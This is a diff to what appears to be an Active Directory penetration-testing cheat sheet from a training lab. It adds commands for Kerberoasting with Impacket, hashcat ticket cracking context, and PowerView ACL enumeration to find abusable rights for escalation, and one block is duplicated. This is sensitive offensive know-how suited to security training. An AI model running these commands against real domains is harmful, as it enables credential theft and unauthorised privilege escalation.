@@ -1352,7 +1352,7 @@ https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server
 ##### Kerberoasting
 ```
 # Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
-impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
+	impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
 
 # Enumerating SPNs with setspn.exe
 setspn.exe -Q */*
@@ -1406,7 +1406,35 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
 Find-InterestingDomainAcl
 
 # Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
-Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley
+Import-Module .\PowerView.ps1 
+$sid = Convert-NameToSid wley
+
+# Using Get-DomainObjectACL
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+# Performing a Reverse Search & Mapping to a GUID Value
+$guid= "00299570-246d-11d0-a768-00aa006e0529"
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+# Using the -ResolveGUIDs Flag
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+# Creating a List of Domain Users
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+# forloop
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+# Creating a List of Domain Users
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+# forloop
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+#Further Enumeration of Rights Using damundsen
+$sid2 = Convert-NameToSid damundsen
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+# Investigating the Help Desk Level 1 Group with Get-DomainGroup
+Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+# Investigating the Information Technology Group
+$itgroupsid = Convert-NameToSid "Information Technology"
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+# Looking for Interesting Access
+$adunnsid = Convert-NameToSid adunn 
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
 
 # Used to create a PSCredential Object from a Windows-based host.
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
